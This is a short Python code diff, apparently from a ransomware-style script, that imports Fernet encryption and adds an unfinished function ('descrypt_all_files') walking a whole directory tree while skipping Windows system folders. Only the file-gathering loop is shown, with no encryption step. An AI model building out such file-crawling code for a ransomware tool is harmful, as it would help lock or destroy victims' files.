@@ -1,6 +1,17 @@
 import os
 from cryptography.fernet import Fernet
 
+def descrypt_all_files(root_dir):
+    all_files = []
+    excluded_dir = ["System32", "Windows", "Program Files", "AppData"]
+
+    for dirpath, dirnames, filenames in os.walk(root_dir):
+        #Exclude some directories
+        dirnames[:] = [d for d in dirnames if d not in excluded_dir]
+
+        for filename in filenames:
+            full_path = os.path.join(dirpath, filename)
+
 files = []
 #this goes through the current directory and puts the files on a list
 for file in os.listdir():
